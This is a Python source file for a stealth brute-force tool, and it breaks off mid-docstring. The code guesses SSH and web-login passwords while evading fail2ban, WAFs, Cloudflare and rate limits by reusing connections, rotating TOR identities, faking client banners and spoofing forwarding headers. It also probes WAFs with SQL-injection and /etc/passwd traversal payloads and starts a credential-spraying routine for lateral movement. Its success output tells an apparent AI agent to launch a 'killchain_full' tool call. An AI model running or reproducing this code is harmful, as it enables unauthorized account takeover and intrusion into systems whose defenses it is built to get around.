#!/usr/bin/env python3
"""

Bypasses: fail2ban, WAF, nginx rate-limit, Cloudflare, mod_security,
          SSH rate-limit, iptables hashlimit, CSF, DenyHosts, etc.

KEY INSIGHT: hydra creates a NEW TCP connection per attempt.
fail2ban counts NEW connections. Solution: REUSE connections via paramiko.

SSH Brute Strategy:
  1. Open ONE paramiko Transport
  2. Try multiple auth attempts on SAME transport (no new TCP = invisible to fail2ban)
  3. When transport dies (server kicks us), wait with jitter and reconnect
  4. Randomize timing to avoid pattern detection
  5. Optional: route through SOCKS proxy / TOR for IP rotation

Web Evasion Strategy:
  1. Rotate User-Agents from real browser pool
  2. Spoof X-Forwarded-For / X-Real-IP headers
  3. Use session/connection reuse (HTTP keep-alive)
  4. Throttle requests with random jitter
  5. TOR/proxy rotation for IP diversity
  6. Detect and handle Cloudflare challenges
"""

import os
import re
import sys
import time
import random
import socket
import hashlib
import threading
import subprocess

try:
    import paramiko
    _PARAMIKO_OK = True
except ImportError:
    paramiko = None
    _PARAMIKO_OK = False

try:
    import requests as _requests
    from requests.adapters import HTTPAdapter
    _REQUESTS_OK = True
except ImportError:
    _requests = None
    _REQUESTS_OK = False

try:
    import socks  # PySocks
    _SOCKS_OK = True
except ImportError:
    socks = None
    _SOCKS_OK = False

try:
    from config import CFG
except ImportError:
    CFG = {}

# ANSI Colors
C_GREEN  = "\033[92m"
C_YELLOW = "\033[93m"
C_RED    = "\033[91m"
C_CYAN   = "\033[96m"
C_GREY   = "\033[90m"
C_BLUE   = "\033[94m"
C_MAGENTA = "\033[95m"
C_RESET  = "\033[0m"

# ═══════════════════════════════════════════════
# USER-AGENT ROTATION POOL (real browser strings)
# ═══════════════════════════════════════════════

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
]

# SSH client banners to rotate (looks like different SSH clients)
_SSH_BANNERS = [
    "SSH-2.0-OpenSSH_9.6",
    "SSH-2.0-OpenSSH_9.4",
    "SSH-2.0-OpenSSH_8.9p1",
    "SSH-2.0-OpenSSH_8.4p1",
    "SSH-2.0-PuTTY_Release_0.80",
    "SSH-2.0-PuTTY_Release_0.79",
    "SSH-2.0-libssh2_1.11.0",
    "SSH-2.0-libssh_0.10.6",
    "SSH-2.0-paramiko_3.4.0",
    "SSH-2.0-JSCH-0.2.17",
]


# ═══════════════════════════════════════════════
# PROXY / TOR MANAGEMENT
# ═══════════════════════════════════════════════

def _check_tor_running() -> bool:
    """Check if TOR SOCKS proxy is available on port 9050."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        result = s.connect_ex(("127.0.0.1", 9050))
        s.close()
        return result == 0
    except Exception:
        return False


def _get_tor_new_identity():
    """Request new TOR circuit (new IP) via control port."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(("127.0.0.1", 9051))
        s.send(b'AUTHENTICATE ""\r\n')
        resp = s.recv(256)
        if b"250" in resp:
            s.send(b"SIGNAL NEWNYM\r\n")
            s.recv(256)
        s.close()
        time.sleep(1)
    except Exception:
        pass


def _create_proxy_socket(host, port, proxy_type="socks5", proxy_host="127.0.0.1", proxy_port=9050):
    """Create a socket routed through SOCKS proxy (TOR/other)."""
    if _SOCKS_OK:
        s = socks.socksocket()
        if proxy_type == "socks5":
            s.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
        elif proxy_type == "socks4":
            s.set_proxy(socks.SOCKS4, proxy_host, proxy_port)
        elif proxy_type == "http":
            s.set_proxy(socks.HTTP, proxy_host, proxy_port)
        s.settimeout(15)
        s.connect((host, port))
        return s
    else:
        # Direct connection fallback
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(15)
        s.connect((host, port))
        return s


# ═══════════════════════════════════════════════
# SSH BRUTEFORCE — PARAMIKO-BASED (fail2ban bypass)
# ═══════════════════════════════════════════════

def ssh_bruteforce_stealth(target: str, port: int = 22, users: list = None,
                           passwords: list = None, password_files: list = None,
                           use_tor: bool = False, max_attempts_per_conn: int = 3,
                           base_delay: float = 2.0, jitter: float = 1.5,
                           ban_wait: int = 300, max_ban_retries: int = 10,
                           max_passwords: int = 5000) -> str:
    """
    Stealth SSH bruteforce using paramiko Transport reuse.

    KEY BYPASS MECHANISM:
    - Opens ONE TCP connection
    - Tries multiple passwords on the SAME transport (fail2ban counts
      CONNECTIONS not AUTH ATTEMPTS within a connection)
    - Server typically allows 3-6 auth attempts per connection before disconnect
    - After disconnect: wait with randomized delay, reconnect
    - Randomized SSH banner per connection to avoid fingerprinting
    - Optional TOR routing for IP rotation

    CRITICAL: On ban/error, idx rolls BACK to the start of the current
    connection's attempts so no credentials are ever skipped.

    Args:
        target: IP or hostname
        port: SSH port
        users: list of usernames to try
        passwords: list of passwords (if provided, password_files ignored)
        password_files: list of wordlist file paths
        use_tor: route through TOR SOCKS5 proxy
        max_attempts_per_conn: auth attempts per TCP connection (3-6 safe)
        base_delay: seconds between auth attempts
        jitter: random +/- jitter added to delay
        ban_wait: seconds to wait if we detect a ban (default 5 min)
        max_ban_retries: max times to wait for ban expiry
        max_passwords: max passwords to load from wordlist files (default 50K)
    """
    if not _PARAMIKO_OK:
        return "[!] paramiko not installed. Install: pip install paramiko"

    print(f"\n  {C_RED}{'═' * 60}{C_RESET}")
    print(f"  {C_RED}  STEALTH SSH BRUTEFORCE — paramiko transport reuse{C_RESET}")
    print(f"  {C_RED}  Target: {target}:{port}{C_RESET}")
    print(f"  {C_RED}  Bypass: fail2ban, DenyHosts, CSF, iptables{C_RESET}")
    print(f"  {C_RED}{'═' * 60}{C_RESET}")

    output = f"[STEALTH SSH BRUTE — {target}:{port}]\n"

    # ── Build user list ──────────────────────────────────────
    if not users:
        users = ["root", "admin", "support", "user", "test"]
    output += f"Users: {users}\n"

    # ── Build password list ──────────────────────────────────
    pwd_list = []
    if passwords:
        pwd_list = list(passwords)
    elif password_files:
        seen = set()
        for fpath in password_files:
            if not os.path.isfile(fpath):
                continue
            try:
                with open(fpath, "r", errors="ignore") as f:
                    for line in f:
                        word = line.strip()
                        if not word or word.startswith('#'):
                            continue
                        if ':' in word and not word.startswith('$'):
                            parts = word.split(':', 1)
                            if len(parts) == 2 and len(parts[1]) < 64:
                                word = parts[1]
                        if word and word not in seen:
                            seen.add(word)
                            pwd_list.append(word)
                            if len(pwd_list) >= max_passwords:
                                break
            except Exception:
                continue
            if len(pwd_list) >= max_passwords:
                break
        if len(pwd_list) >= max_passwords:
            print(f"  {C_YELLOW}[!] Password list capped at {max_passwords:,} (from {len(password_files)} files){C_RESET}")
    else:
        # Default small list
        pwd_list = [
            "qweqwe123", "root", "toor", "admin", "password", "123456", "12345678",
            "1234", "support", "test", "guest", "changeme", "letmein",
            "welcome", "monkey", "dragon", "master", "qwerty", "login",
            "abc123", "passw0rd", "pass123", "administrator", "P@ssw0rd",
            "p@$$w0rd", "root123", "admin123", "default", "1q2w3e4r",
        ]

    total_combos = len(pwd_list) * len(users)
    output += f"Passwords: {len(pwd_list):,}\n"
    output += f"Total combinations: {total_combos:,}\n"
    est_secs = total_combos * (base_delay + jitter / 2)
    output += f"Estimated time: ~{_fmt_time(int(est_secs))}\n"
    output += f"Mode: {max_attempts_per_conn} attempts/connection, "
    output += f"{base_delay}s±{jitter}s delay\n"

    # ── TOR check ────────────────────────────────────────────
    tor_available = False
    if use_tor:
        tor_available = _check_tor_running()
        if tor_available:
            print(f"  {C_GREEN}[+] TOR proxy detected on :9050 — routing through TOR{C_RESET}")
            output += "Routing: TOR SOCKS5 (IP rotation enabled)\n"
        else:
            print(f"  {C_YELLOW}[!] TOR not running on :9050 — using direct connection{C_RESET}")
            output += "Routing: DIRECT (TOR not available)\n"
    else:
        output += "Routing: DIRECT\n"

    print(f"  {C_CYAN}[*] {len(pwd_list):,} passwords × {len(users)} users = {total_combos:,} combos{C_RESET}")
    print(f"  {C_CYAN}[*] ~{max_attempts_per_conn} attempts/connection, {base_delay}s±{jitter}s delay{C_RESET}")
    print(f"  {C_CYAN}[*] Ban wait: {ban_wait}s, max ban retries: {max_ban_retries}{C_RESET}")

    # ── BRUTE LOOP ───────────────────────────────────────────
    attempt_num = 0
    found_creds = []
    ban_count = 0
    connections_made = 0
    start_time = time.time()
    consecutive_bans = 0  # Track consecutive bans without progress

    # Generate attempt queue: width-first (try each password on all users)
    attempt_queue = []
    for pwd in pwd_list:
        for user in users:
            attempt_queue.append((user, pwd))

    idx = 0
    while idx < len(attempt_queue):
        # ── Save idx at connection start for rollback on error ──
        idx_at_conn_start = idx
        banner = random.choice(_SSH_BANNERS)
        transport = None
        attempts_this_conn = 0
        conn_had_error = False  # Track if this connection ended in error

        try:
            # Create socket (direct or via TOR)
            if tor_available and _SOCKS_OK:
                sock = _create_proxy_socket(target, port)
                # Request new TOR identity every 3 connections
                if connections_made % 3 == 0 and connections_made > 0:
                    _get_tor_new_identity()
                    print(f"  {C_BLUE}[TOR] New circuit requested (connection #{connections_made}){C_RESET}")
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(15)
                sock.connect((target, port))

            transport = paramiko.Transport(sock)
            transport.local_version = banner
            transport.connect()
            connections_made += 1
            consecutive_bans = 0  # Reset consecutive ban counter on successful connect

            # ── Try multiple auths on this transport ─────────
            while attempts_this_conn < max_attempts_per_conn and idx < len(attempt_queue):
                user, pwd = attempt_queue[idx]
                # DO NOT increment idx yet — only after confirmed auth result
                attempt_num += 1
                attempts_this_conn += 1

                # Progress display
                elapsed = int(time.time() - start_time)
                rate = attempt_num / max(elapsed, 1)
                if attempt_num % 5 == 0 or attempt_num <= 3:
                    print(f"  {C_GREY}[{elapsed}s] #{attempt_num}/{total_combos} "
                          f"({rate:.1f}/s) {user}:{pwd[:20]}{'...' if len(pwd) > 20 else ''} "
                          f"[conn#{connections_made}]{C_RESET}")

                try:
                    transport.auth_password(user, pwd)
                    # SUCCESS! Auth returned without exception = valid creds
                    idx += 1  # This attempt completed — advance
                    found_creds.append((user, pwd))
                    elapsed = int(time.time() - start_time)
                    msg = f"\n  {C_GREEN}[+] CREDENTIALS FOUND: {user}:{pwd} @ {target}:{port} [{elapsed}s]{C_RESET}"
                    print(msg)
                    output += f"\n[+] VALID CREDENTIALS: {user}:{pwd}\n"
                    output += f"    Found at attempt #{attempt_num} after {_fmt_time(elapsed)}\n"
                    output += f"    Connections made: {connections_made}\n"

                    # Keep searching for more creds? Only if small list
                    if total_combos > 100:
                        transport.close()
                        output += _format_brute_summary(found_creds, attempt_num, connections_made,
                                                       elapsed, ban_count)
                        return output
                    # For small lists, continue to find all valid creds

                except paramiko.AuthenticationException:
                    # Wrong password — this attempt completed, advance idx
                    idx += 1
                except paramiko.SSHException as e:
                    err_str = str(e).lower()
                    if "too many" in err_str or "not allowed" in err_str:
                        # Server kicked us — max auth attempts reached
                        # This attempt MAY not have been evaluated; DON'T advance idx
                        conn_had_error = True
                        break
                    elif "no authentication" in err_str:
                        conn_had_error = True
                        break
                    else:
                        conn_had_error = True
                        break
                except EOFError:
                    # Transport died mid-auth — this attempt was NOT evaluated
                    conn_had_error = True
                    break
                except Exception:
                    conn_had_error = True
                    break

                # ── Random delay between attempts ────────────
                delay = base_delay + random.uniform(-jitter, jitter)
                delay = max(0.5, delay)  # never less than 0.5s
                time.sleep(delay)

        except (ConnectionRefusedError, OSError, socket.timeout) as e:
            # ── BAN DETECTED ─────────────────────────────────
            ban_count += 1
            consecutive_bans += 1
            conn_had_error = True
            elapsed = int(time.time() - start_time)

            # CRITICAL: Roll back idx to retry ALL attempts from this connection
            if idx > idx_at_conn_start:
                rolled_back = idx - idx_at_conn_start
                idx = idx_at_conn_start
                print(f"  {C_YELLOW}[↩] Rolling back {rolled_back} attempts to retry after ban{C_RESET}")

            if ban_count > max_ban_retries:
                print(f"\n  {C_RED}[!] Max ban retries ({max_ban_retries}) exceeded — stopping{C_RESET}")
                output += f"\n[!] Stopped: max ban retries exceeded ({ban_count})\n"
                break

            # Adaptive ban wait: increases with each CONSECUTIVE ban
            if tor_available and _SOCKS_OK:
                _get_tor_new_identity()
                print(f"  {C_BLUE}[TOR] New identity requested — bypassing ban{C_RESET}")
                # TOR: very short wait — new IP = ban doesn't apply
                actual_wait = 10 + random.randint(0, 10)
            else:
                # Direct: adaptive wait increases with consecutive bans
                actual_wait = ban_wait + (consecutive_bans - 1) * 60
                actual_wait = min(actual_wait, 600)  # cap at 10 min

            print(f"\n  {C_YELLOW}[BAN #{ban_count}] Connection refused at attempt #{attempt_num} "
                  f"(conn#{connections_made}){C_RESET}")
            print(f"  {C_YELLOW}[*] Waiting {actual_wait}s for ban expiry "
                  f"(progress: {idx}/{total_combos}, elapsed: {_fmt_time(elapsed)}){C_RESET}")

            # Show countdown — use TOR socket for port check if TOR is available
            for remaining in range(actual_wait, 0, -30):
                try:
                    if tor_available and _SOCKS_OK:
                        test_sock = _create_proxy_socket(target, port)
                        test_sock.close()
                    else:
                        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        test_sock.settimeout(3)
                        if test_sock.connect_ex((target, port)) != 0:
                            test_sock.close()
                            raise ConnectionRefusedError("still banned")
                        test_sock.close()
                    # If we get here, port is reachable
                    print(f"  {C_GREEN}[+] Port {port} reachable again! Resuming...{C_RESET}")
                    time.sleep(2 + random.uniform(0, 3))  # Extra small random wait
                    break
                except Exception:
                    pass
                time.sleep(min(30, remaining))
                if remaining > 30:
                    print(f"  {C_GREY}    ... {remaining - 30}s remaining{C_RESET}")

        except paramiko.SSHException as e:
            # Protocol error — roll back and retry
            conn_had_error = True
            if idx > idx_at_conn_start:
                idx = idx_at_conn_start
            time.sleep(3 + random.uniform(0, 2))

        except Exception as e:
            conn_had_error = True
            if idx > idx_at_conn_start:
                idx = idx_at_conn_start
            time.sleep(2)

        finally:
            try:
                if transport:
                    transport.close()
            except Exception:
                pass

        # ── Small random delay between connections ───────────
        conn_delay = random.uniform(1.0, 3.0)
        time.sleep(conn_delay)

    # ── Final summary ────────────────────────────────────────
    elapsed = int(time.time() - start_time)
    output += _format_brute_summary(found_creds, attempt_num, connections_made, elapsed, ban_count)
    return output


def _format_brute_summary(found_creds, attempts, connections, elapsed, bans):
    """Format bruteforce result summary."""
    out = f"\n{'═' * 60}\n"
    out += f"STEALTH BRUTE COMPLETE\n"
    out += f"  Attempts: {attempts:,}\n"
    out += f"  Connections: {connections:,}\n"
    out += f"  Bans detected: {bans}\n"
    out += f"  Time: {_fmt_time(elapsed)}\n"
    out += f"  Rate: {attempts / max(elapsed, 1):.2f} attempts/sec\n"

    if found_creds:
        out += f"\n  [+] CREDENTIALS FOUND ({len(found_creds)}):\n"
        for user, pwd in found_creds:
            out += f"      {user}:{pwd}\n"
        out += f"\nAI: Credentials found! Run kill chain:\n"
        out += f"[TOOL: killchain_full TARGET {found_creds[0][0]} {found_creds[0][1]}]\n"
    else:
        out += f"\n  [-] No credentials found.\n"

    return out


def _fmt_time(secs: int) -> str:
    if secs < 120:
        return f"{secs}s"
    elif secs < 3600:
        return f"{secs // 60}m{secs % 60:02d}s"
    else:
        h = secs // 3600
        m = (secs % 3600) // 60
        return f"{h}h{m:02d}m"


# ═══════════════════════════════════════════════
# WEB EVASION ENGINE
# ═══════════════════════════════════════════════

class WebEvasionSession:
    """
    HTTP session with built-in evasion for WAF, Cloudflare, nginx rate-limit.

    Bypass mechanisms:
    - User-Agent rotation (real browser pool)
    - X-Forwarded-For spoofing (random IPs)
    - Connection reuse (HTTP keep-alive)
    - Request throttling with jitter
    - TOR/SOCKS proxy rotation
    - Cloudflare challenge detection
    - Custom header injection
    - Referer chain building
    """

    def __init__(self, use_tor: bool = False, delay: float = 1.0,
                 jitter: float = 0.5, rotate_ua: bool = True):
        if not _REQUESTS_OK:
            raise ImportError("requests not installed")

        self.session = _requests.Session()
        self.use_tor = use_tor and _check_tor_running()
        self.delay = delay
        self.jitter = jitter
        self.rotate_ua = rotate_ua
        self.request_count = 0
        self._last_request_time = 0

        # Configure proxy
        if self.use_tor:
            self.session.proxies = {
                "http": "socks5h://127.0.0.1:9050",
                "https": "socks5h://127.0.0.1:9050",
            }

        # Connection pooling (reuse connections = fewer new TCP = less detection)
        adapter = HTTPAdapter(
            pool_connections=10,
            pool_maxsize=10,
            max_retries=3,
        )
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

        # Disable SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def _get_headers(self, url: str = "", extra_headers: dict = None) -> dict:
        """Generate evasive request headers."""
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": random.choice([
                "en-US,en;q=0.5",
                "en-GB,en;q=0.9",
                "de-DE,de;q=0.9,en;q=0.5",
                "fr-FR,fr;q=0.9,en;q=0.5",
                "ru-RU,ru;q=0.9,en;q=0.5",
            ]),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": random.choice(["max-age=0", "no-cache", ""]),
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
            "Sec-Fetch-User": "?1",
            "DNT": "1",
        }

        if self.rotate_ua:
            headers["User-Agent"] = random.choice(_USER_AGENTS)
        else:
            headers["User-Agent"] = _USER_AGENTS[0]

        # X-Forwarded-For spoofing (bypass IP-based rate limiting)
        fake_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        headers["X-Forwarded-For"] = fake_ip
        headers["X-Real-IP"] = fake_ip
        headers["X-Originating-IP"] = fake_ip
        headers["CF-Connecting-IP"] = fake_ip  # Cloudflare header
        headers["True-Client-IP"] = fake_ip  # Akamai header
        headers["X-Client-IP"] = fake_ip

        # Referer chain
        if url:
            domain = url.split("//")[-1].split("/")[0]
            headers["Referer"] = random.choice([
                f"https://www.google.com/search?q={domain}",
                f"https://{domain}/",
                f"https://www.bing.com/search?q={domain}",
                "",
            ])

        if extra_headers:
            headers.update(extra_headers)

        return headers

    def _throttle(self):
        """Apply rate limiting with jitter to avoid detection."""
        now = time.time()
        elapsed = now - self._last_request_time
        desired_delay = self.delay + random.uniform(-self.jitter, self.jitter)
        desired_delay = max(0.1, desired_delay)
        if elapsed < desired_delay:
            time.sleep(desired_delay - elapsed)
        self._last_request_time = time.time()

    def get(self, url: str, **kwargs) -> '_requests.Response':
        """Evasive GET request."""
        self._throttle()
        self.request_count += 1

        headers = self._get_headers(url, kwargs.pop("headers", None))
        kwargs.setdefault("verify", False)
        kwargs.setdefault("timeout", (5, 15))
        kwargs.setdefault("allow_redirects", True)

        # TOR identity rotation every 20 requests
        if self.use_tor and self.request_count % 20 == 0:
            _get_tor_new_identity()

        resp = self.session.get(url, headers=headers, **kwargs)

        # Cloudflare detection
        if self._is_cloudflare_challenge(resp):
            print(f"  {C_YELLOW}[WAF] Cloudflare challenge detected — waiting...{C_RESET}")
            time.sleep(5)
            if self.use_tor:
                _get_tor_new_identity()
            resp = self.session.get(url, headers=self._get_headers(url), **kwargs)

        return resp

    def post(self, url: str, **kwargs) -> '_requests.Response':
        """Evasive POST request."""
        self._throttle()
        self.request_count += 1

        headers = self._get_headers(url, kwargs.pop("headers", None))
        headers["Content-Type"] = kwargs.pop("content_type",
                                             "application/x-www-form-urlencoded")
        kwargs.setdefault("verify", False)
        kwargs.setdefault("timeout", (5, 15))

        if self.use_tor and self.request_count % 20 == 0:
            _get_tor_new_identity()

        resp = self.session.post(url, headers=headers, **kwargs)

        if self._is_cloudflare_challenge(resp):
            print(f"  {C_YELLOW}[WAF] Cloudflare challenge on POST — rotating...{C_RESET}")
            time.sleep(5)
            if self.use_tor:
                _get_tor_new_identity()
            resp = self.session.post(url, headers=self._get_headers(url), **kwargs)

        return resp

    def _is_cloudflare_challenge(self, resp) -> bool:
        """Detect Cloudflare challenge/block pages."""
        if resp.status_code == 403:
            cf_headers = ["cf-ray", "cf-cache-status", "cf-request-id"]
            if any(h in resp.headers for h in cf_headers):
                return True
        if resp.status_code == 503:
            if "cloudflare" in resp.text.lower() or "cf-" in str(resp.headers).lower():
                return True
        if "checking your browser" in resp.text.lower():
            return True
        if resp.status_code == 429:  # Rate limited
            return True
        return False

    def detect_waf(self, url: str) -> dict:
        """Detect WAF type and characteristics."""
        result = {"waf_detected": False, "waf_type": "none", "details": []}

        try:
            # Normal request
            resp = self.get(url)
            headers = dict(resp.headers)

            # Check response headers for WAF signatures
            waf_signatures = {
                "cloudflare": ["cf-ray", "cf-cache-status", "__cfduid"],
                "akamai": ["x-akamai-", "akamai-grn"],
                "aws_waf": ["x-amzn-requestid", "x-amz-cf-"],
                "imperva": ["x-cdn", "incap_ses_"],
                "sucuri": ["x-sucuri-id", "x-sucuri-cache"],
                "modsecurity": ["mod_security", "modsecurity"],
                "f5_bigip": ["x-wa-info", "bigipserver"],
                "barracuda": ["barra_counter_session"],
                "fortiweb": ["fortiwafsid"],
                "nginx_limiter": ["x-ratelimit-", "retry-after"],
            }

            headers_lower = {k.lower(): v for k, v in headers.items()}
            cookies = str(resp.cookies.get_dict()).lower()

            for waf_name, signatures in waf_signatures.items():
                for sig in signatures:
                    sig_lower = sig.lower()
                    if any(sig_lower in h for h in headers_lower) or sig_lower in cookies:
                        result["waf_detected"] = True
                        result["waf_type"] = waf_name
                        result["details"].append(f"Signature: {sig}")

            # Test with suspicious payload to trigger WAF
            test_payloads = [
                f"{url}?id=1' OR 1=1--",
                f"{url}?cmd=cat /etc/passwd",
                f"{url}?file=../../etc/passwd",
            ]
            for payload in test_payloads:
                try:
                    tresp = self.get(payload, allow_redirects=False)
                    if tresp.status_code in [403, 406, 429, 503]:
                        result["waf_detected"] = True
                        result["details"].append(
                            f"Blocked payload (HTTP {tresp.status_code}): {payload.split('?')[1][:50]}")
                except Exception:
                    pass

        except Exception as e:
            result["details"].append(f"Error: {e}")

        return result


# ═══════════════════════════════════════════════
# WEB LOGIN BRUTEFORCE WITH EVASION
# ═══════════════════════════════════════════════

def web_bruteforce_stealth(url: str, users: list = None, passwords: list = None,
                           password_files: list = None, use_tor: bool = False,
                           form_data: dict = None) -> str:
    """
    Stealth web login bruteforce with WAF/rate-limit evasion.

    - UA rotation + X-Forwarded-For spoofing per request
    - Session-based (cookies preserved for CSRF token handling)
    - Automatic CSRF token extraction
    - Cloudflare challenge detection
    - Rate throttling with jitter
    """
    print(f"\n  {C_RED}[STEALTH WEB BRUTE] {url}{C_RESET}")
    output = f"[STEALTH WEB BRUTE — {url}]\n"

    session = WebEvasionSession(use_tor=use_tor, delay=1.5, jitter=0.5)

    if not users:
        users = ["admin", "root", "administrator", "user", "test"]
    if not passwords and not password_files:
        passwords = ["admin", "password", "123456", "admin123", "root",
                     "toor", "test", "changeme", "letmein", "welcome"]

    # Load passwords from files
    if password_files and not passwords:
        passwords = []
        seen = set()
        for fpath in password_files:
            try:
                with open(fpath, "r", errors="ignore") as f:
                    for line in f:
                        word = line.strip()
                        if word and word not in seen and not word.startswith('#'):
                            seen.add(word)
                            passwords.append(word)
                            if len(passwords) >= 5000:
                                break
            except Exception:
                continue

    # ── Detect login form ────────────────────────────────────
    print(f"  {C_CYAN}[*] Fetching login page...{C_RESET}")
    try:
        resp = session.get(url)
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(resp.text, "html.parser")

        # Find login form
        forms = soup.find_all("form")
        login_form = None
        for form in forms:
            inputs = form.find_all("input")
            input_names = [i.get("name", "").lower() for i in inputs]
            if any("pass" in n or "pwd" in n for n in input_names):
                login_form = form
                break

        if not login_form and not form_data:
            output += "[!] No login form detected on page.\n"
            return output

        if login_form and not form_data:
            action = login_form.get("action", "")
            method = login_form.get("method", "POST").upper()
            if action and not action.startswith("http"):
                from urllib.parse import urljoin
                action = urljoin(url, action)
            elif not action:
                action = url

            # Extract form fields
            form_data = {}
            user_field = None
            pass_field = None
            for inp in login_form.find_all(["input", "select", "textarea"]):
                name = inp.get("name", "")
                value = inp.get("value", "")
                itype = inp.get("type", "text").lower()
                if not name:
                    continue
                if itype == "password" or "pass" in name.lower() or "pwd" in name.lower():
                    pass_field = name
                elif itype in ("text", "email") or "user" in name.lower() or "login" in name.lower() or "email" in name.lower():
                    user_field = name
                elif itype == "hidden":
                    form_data[name] = value  # CSRF tokens, etc.
                elif itype == "submit":
                    form_data[name] = value or "Login"

            if not user_field or not pass_field:
                output += f"[!] Could not identify user/pass fields. Fields found: {list(form_data.keys())}\n"
                return output

            output += f"Form: {method} {action}\n"
            output += f"User field: {user_field}, Pass field: {pass_field}\n"
            output += f"Hidden fields: {form_data}\n"

    except Exception as e:
        output += f"[!] Failed to fetch login page: {e}\n"
        return output

    # ── Bruteforce loop ──────────────────────────────────────
    found_creds = []
    attempt = 0
    total = len(users) * len(passwords)

    print(f"  {C_CYAN}[*] {len(passwords)} passwords × {len(users)} users = {total} combos{C_RESET}")

    for pwd in passwords:
        for user_val in users:
            attempt += 1
            post_data = dict(form_data)
            post_data[user_field] = user_val
            post_data[pass_field] = pwd

            if attempt % 10 == 0 or attempt <= 3:
                print(f"  {C_GREY}[{attempt}/{total}] {user_val}:{pwd[:20]}{C_RESET}")

            try:
                # Re-fetch page periodically to get fresh CSRF tokens
                if attempt % 50 == 0:
                    try:
                        fresh = session.get(url)
                        fresh_soup = BeautifulSoup(fresh.text, "html.parser")
                        fresh_form = fresh_soup.find("form")
                        if fresh_form:
                            for hidden in fresh_form.find_all("input", {"type": "hidden"}):
                                hname = hidden.get("name", "")
                                hval = hidden.get("value", "")
                                if hname:
                                    post_data[hname] = hval
                    except Exception:
                        pass

                resp = session.post(action, data=post_data)

                # Detect success
                resp_lower = resp.text.lower()
                is_success = (
                    resp.status_code in [200, 302, 303] and
                    not any(fail in resp_lower for fail in [
                        "invalid", "incorrect", "wrong", "failed", "error",
                        "denied", "unauthorized", "bad credentials",
                    ]) and
                    (resp.status_code in [302, 303] or
                     any(ok in resp_lower for ok in [
                         "dashboard", "welcome", "logout", "profile",
                         "settings", "my account", "admin panel",
                     ]))
                )

                if is_success:
                    found_creds.append((user_val, pwd))
                    print(f"\n  {C_GREEN}[+] WEB CREDS FOUND: {user_val}:{pwd}{C_RESET}")
                    output += f"\n[+] VALID: {user_val}:{pwd}\n"

            except Exception as e:
                if "429" in str(e) or "rate" in str(e).lower():
                    print(f"  {C_YELLOW}[RATE-LIMITED] Waiting 30s...{C_RESET}")
                    time.sleep(30)
                continue

    output += f"\nAttempts: {attempt}/{total}\n"
    if found_creds:
        output += f"[+] Found {len(found_creds)} valid credential(s)\n"
    else:
        output += f"[-] No valid credentials found\n"

    return output


# ═══════════════════════════════════════════════
# PORT-AGNOSTIC SERVICE BRUTEFORCE
# ═══════════════════════════════════════════════

def service_bruteforce_stealth(service: str, target: str, port: int = None,
                               users: list = None, password_files: list = None,
                               use_tor: bool = False) -> str:
    """
    Universal service bruteforce dispatcher.
    Routes to the right stealth brute engine based on service type.
    """
    if service in ("ssh", "sftp"):
        port = port or 22
        return ssh_bruteforce_stealth(
            target, port=port, users=users, password_files=password_files,
            use_tor=use_tor, max_attempts_per_conn=3,
            base_delay=2.5, jitter=1.5, ban_wait=300
        )

    elif service in ("http-post-form", "http-post", "web", "http"):
        url = f"http://{target}:{port}" if port and port != 80 else f"http://{target}"
        return web_bruteforce_stealth(url, users=users, password_files=password_files,
                                     use_tor=use_tor)

    elif service in ("https-post-form", "https"):
        url = f"https://{target}:{port}" if port and port != 443 else f"https://{target}"
        return web_bruteforce_stealth(url, users=users, password_files=password_files,
                                     use_tor=use_tor)

    else:
        # For FTP, MySQL, etc. — fall back to hydra (less targeted by fail2ban)
        return None  # Caller should use original hydra bruteforce


# ═══════════════════════════════════════════════
# v7.0: CREDENTIAL SPRAYING (LATERAL MOVEMENT)
# ═══════════════════════════════════════════════

def credential_spray(targets: list, creds: list, service: str = "ssh", delay: float = 2.0) -> list:
    """
    v7.0: Perform credential spraying for lateral movement.
    Tries each credential against ALL targets before moving to the next credential.
    This prevents locking out accounts by spacing out attempts on the same host.
    
    Args:
        targets: List of IPs/hosts to spray.
